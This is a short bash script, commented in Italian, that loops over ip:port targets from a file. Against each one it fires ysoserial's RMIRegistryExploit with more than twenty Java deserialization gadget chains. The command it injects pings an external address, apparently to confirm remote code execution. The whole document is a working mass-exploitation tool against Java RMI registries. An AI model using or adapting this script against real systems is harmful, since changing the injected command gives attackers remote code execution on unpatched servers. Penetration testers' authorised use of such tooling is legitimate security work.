#!/bin/bash

# Modifica qui il path al file dei target
TARGET_FILE="targets.txt"

# Loop per ogni riga del file (formato ip:porta)
while IFS=: read -r ip port; do
  echo "[*] Target corrente: $ip:$port"
  
  for payload in CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 Jdk7u21 Hibernate1 Hibernate2 JSON1 JBossInterceptors1 JavassistWeld1 MozillaRhino1 MozillaRhino2 Spring1 Spring2 ROME Vaadin1 Click1 Clojure; do
    echo "    [+] Testing $payload"
    timeout 10s java -cp ysoserialall.jar ysoserial.exploit.RMIRegistryExploit "$ip" "$port" "$payload" 'ping -c 1 10.169.44.150'
  done

done < "$TARGET_FILE"
